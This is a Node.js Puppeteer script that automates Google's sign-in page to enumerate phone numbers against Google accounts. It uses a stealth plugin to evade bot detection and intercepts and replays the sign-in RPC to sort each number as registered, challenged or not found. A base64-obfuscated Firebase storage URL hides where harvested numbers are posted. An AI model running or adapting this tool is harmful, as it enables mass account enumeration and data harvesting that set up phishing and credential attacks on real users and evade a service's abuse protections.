const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')


let USER = process.argv.slice(2)[0]

let mConfig = null
let mLoaded = false
let page = null
let mAutoDelay = 500
let mPendingData = {}
let mFinishData = 0
let mStart = Date.now()
let isFirstRequest = true

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            mConfig = json
        } else if (json.t == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


startBrowser()


setInterval(async () => {
    await pageReload()
}, 3600000)


async function startBrowser() {
    console.log('Delay:', mAutoDelay)
    
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
                    loginDataProcess(url, request.headers(), request.postData())
                    
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mLoaded = true

        console.log('Page Load Success')
        
        await foundLoginNumber()
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}


async function foundLoginNumber() {
    while (true) {
        if (mConfig) {
            mStart = Date.now()
            try {
                let prev = mConfig.n
                let target = mConfig.s
                
                mPendingData = {}
                mFinishData = 0

                for (let i = 0; i < target; i++) {
                    if (prev != mConfig.n) {
                        i = 0
                        target = mConfig.s
                        mPendingData = {}
                        mFinishData = 0
                    }

                    let number = mConfig.n+i

                    mPendingData[number.toString()] = {
                        finish:false
                    }

                    await setLoginRequest(number.toString())

                    await delay(Math.min(mConfig.d, 2000))
                }

                let result = await waitForFinish(target)

                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })
            } catch (error) {}

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}

async function waitForFinish(target) {
    let startTime = Date.now()
    let timeout = target * 3000

    while (true) {
        if (Date.now() - startTime > timeout) {
            break
        }

        if (mFinishData >= target) {
            break
        }

        await delay(100)
    }

    let result = {
        f:0,
        r:0,
        c:0,
        o:0
    }


    for (let value of Object.values(mPendingData)) {
        if (value.finish) {
            if (value.status == 1) {
                result.f++
            } else if (value.status == 2) {
                result.r++
            } else if (value.status == 5) {
                result.c++
            } else if (value.status == 3 || value.status == 0) {
                result.o++
            }
        }
    }

    return result
}


async function setLoginRequest(number) {
    try {
        for (let i = 0; i < 60; i++) {
            if (mLoaded) {
                break
            }
            await delay(500)
        }

        if (mLoaded) {
            page.evaluate((number) => {
                document.querySelector('input#identifierId').value = number
                document.querySelector('#identifierNext').click()
            }, '+'+number)
            
            await delay(mAutoDelay)

            if (isFirstRequest) {
                for (let i = 0; i < 20; i++) {
                    if(mPendingData[number].finish) {
                        break
                    }
                    await delay(250)
                }
                isFirstRequest = false
            }
        }
    } catch (error) {}
}

async function loginDataProcess(url, reqHeaders, postData) {
    try {
        let data = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])[1]
        let number = data.replace('+', '')

        let status = 0

        try {
            let res = await fetch(url, {
                method: 'POST',
                headers: reqHeaders,
                body: postData
            })

            let data = await res.text()

            let json = extractArrays(data)[0][0]

            if (json[1] == 'MI613e') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let values = JSON.stringify(value[21])
                    if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
                        status = 1
                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                        status = 2
                    } else {
                        status = 3
                    }
                } else if (value[18] && value[18][0]) {
                    status = 5
                } else {
                    status = 4
                }
            }
        } catch (e) {}

        mPendingData[number] = {
            finish:true,
            status:status
        }

        mFinishData++
    } catch (error) {}
}

async function pageReload() {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
                await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            
            isFirstRequest = true
            break
        } catch (error) {}
    }
}

function extractArrays(raw) {
    raw = raw.replace(/^\)\]\}'\s*/g, '')

    let lines = raw.split('\n')

    let arrays = []

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim()

        if (line.startsWith('[')) {
            try {
                arrays.push(JSON.parse(line))
            } catch {}
        }
    }

    return arrays
}

async function saveNumber(user, key, number) {
    try {
        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
            method: 'POST',
            body: ''
        })
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
